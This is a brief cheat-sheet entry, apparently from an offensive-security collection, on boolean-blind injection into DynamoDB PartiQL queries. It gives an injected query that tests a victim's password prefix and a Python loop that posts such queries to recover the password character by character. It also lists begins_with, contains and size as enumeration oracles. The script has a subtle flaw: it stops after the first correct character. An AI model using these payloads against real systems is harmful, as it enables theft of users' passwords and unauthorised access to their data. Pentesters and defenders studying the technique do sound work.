# DynamoDB PartiQL Boolean-Blind Injection

DynamoDB endpoints accepting PartiQL queries can be exploited via boolean-blind injection when output is suppressed.

Use `begins_with()` as a single-character oracle to brute-force attribute values:

```
# Test if password starts with 'a'
SELECT * FROM Users WHERE email='victim@example.com' AND begins_with(password, 'a')

# Automate character-by-character with a script
import requests, string

known = ""
for c in string.printable:
    r = requests.post(url, json={"query": f"SELECT * FROM Users WHERE email='victim' AND begins_with(password, '{known+c}')"})
    if r.status_code == 200 and "item" in r.text:
        known += c
        break
```

Other useful PartiQL functions for enumeration:
- `begins_with(attr, 'prefix')` — prefix oracle
- `contains(attr, 'substr')` — substring check
- `size(attr) = N` — length oracle
